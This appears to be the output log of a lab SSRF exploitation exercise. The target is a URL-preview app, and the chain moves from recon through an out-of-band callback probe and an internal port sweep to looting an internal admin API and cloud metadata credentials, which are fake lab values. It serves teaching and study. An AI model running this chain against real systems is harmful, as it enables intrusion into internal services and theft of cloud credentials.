@@ -1,0 +1,125 @@
+SSRF KILL-CHAIN  —  target: http://localhost:8888
+(all internal access below is pivoted through the app's SSRF)
+
+========================================================================
+  TASK 1: Discovery — map the attack surface
+========================================================================
+[*] GET /robots.txt
+
+User-agent: *
+Disallow: /preview
+Disallow: /internal-notes.txt
+
+[*] Following the disallowed path /internal-notes.txt
+TODO(devops): the preview fetcher can reach the internal admin API and the
+cloud metadata service. Lock down egress before GA. -- 2026-02
+
+[+] Attack surface: /preview?url=  looks like a URL fetcher -> candidate SSRF sink
+
+========================================================================
+  TASK 2: Vulnerability analysis — is /preview a real SSRF?
+========================================================================
+[*] Point /preview at a URL only the SERVER-SIDE fetch could resolve...
+[+] The app resolved 'metadata.internal' — a name that does NOT exist on the
+    attacker host. Only the app's own network can resolve it. SSRF confirmed (in-band).
+
+[*] Out-of-band check: ask the app to fetch our callback http://host.docker.internal:9000/ssrf-probe-abc123
+[+] Now check the callback listener window — an inbound hit there proves the
+    server called home even if its HTTP response told us nothing (blind SSRF).
+
+========================================================================
+  TASK 3: Exploit development — build + verify the internal port scanner
+========================================================================
+[*] Sweeping internal hostnames/ports through the SSRF sink...
+    LIVE  http://internal-api:80/                   {   "service": "internal-admin-api",   "version": "2.1",   "
+    LIVE  http://admin.internal:80/                 {   "service": "internal-admin-api",   "version": "2.1",   "
+    LIVE  http://metadata.internal:80/              ami-id hostname iam/ instance-id 
+    ERR   http://internal-api:9999/                 HTTPError
+    LIVE  http://localhost:80/                      <!doctype html> <html><head><title>LinkPeek - URL Preview Se
+
+[+] Live internal targets discovered: 4
+
+========================================================================
+  TASK 4: Exploit delivery — reach the internal admin API (initial access)
+========================================================================
+[*] The admin API has NO host port. Reaching it directly is impossible.
+    Delivering the request THROUGH the SSRF instead:
+
+    GET http://internal-api/  ->
+    {
+      "service": "internal-admin-api",
+      "version": "2.1",
+      "auth": "none (internal network only)",
+      "endpoints": [
+        "/admin/users",
+        "/admin/config"
+      ]
+    }
+
+[+] Foothold established: we can now drive the internal admin API at will.
+
+========================================================================
+  TASK 5: Post-exploitation — enumerate internal, loot admin + cloud metadata
+========================================================================
+[*] Enumerate admin users (internal-only endpoint, via SSRF):
+    {
+      "users": [
+        {
+          "id": 1,
+          "user": "svc-deploy",
+          "role": "admin",
+          "note": "CI/CD service account"
+        },
+        {
+          "id": 2,
+          "user": "j.reyes",
+          "role": "operator",
+          "note": "on-call"
+        },
+        {
+          "id": 3,
+          "user": "backup",
+          "role": "readonly",
+          "note": "nightly dumps"
+        }
+      ]
+    }
+
+[*] Pull internal config (contains an internal flag):
+    {
+      "db_host": "db.internal:5432",
+      "feature_flags": {
+        "new_billing": true
+      },
+      "internal_flag": "LAB{ssrf_pivot_to_internal_admin_api}"
+    }
+
+[*] The big one — steer the SSRF at the cloud metadata service.
+    (In real AWS this is http://169.254.169.254/ ; here: http://metadata.internal/)
+
+    Step A: list the IAM role attached to the instance
+      role = linkpeek-app-ec2-role
+
+    Step B: fetch that role's TEMPORARY CREDENTIALS
+    {
+      "Code": "Success",
+      "LastUpdated": "2026-09-28T22:00:00Z",
+      "Type": "AWS-HMAC",
+      "AccessKeyId": "AKIAFAKELABEXAMPLE01",
+      "SecretAccessKey": "wJalrXUtnFEMI/FAKE/LAB/EXAMPLEKEYDONOTUSE",
+      "Token": "FQoGZXIvYXdzEXAMPLEFAKESESSIONTOKENxxxxxxxxxxxxxxxxxxxxxxxxxxxx==",
+      "Expiration": "2026-09-29T04:00:00Z"
+    }
+
+[+] LOOTED cloud credentials (fake, lab-only):
+      AccessKeyId     = AKIAFAKELABEXAMPLE01
+      SecretAccessKey = wJalrXUtnFEM... (redacted)
+      Token           = FQoGZXIvYXdzEXAMPLEFAKES... (redacted)
+
+    -> In a real breach these keys would now be used from the ATTACKER's
+       machine to call the cloud API (e.g. list/download S3 buckets).
+       This is precisely the Capital One 2019 mechanism.
+
+========================================================================
+  CHAIN COMPLETE — recon -> SSRF -> internal pivot -> admin loot -> cloud creds
+========================================================================
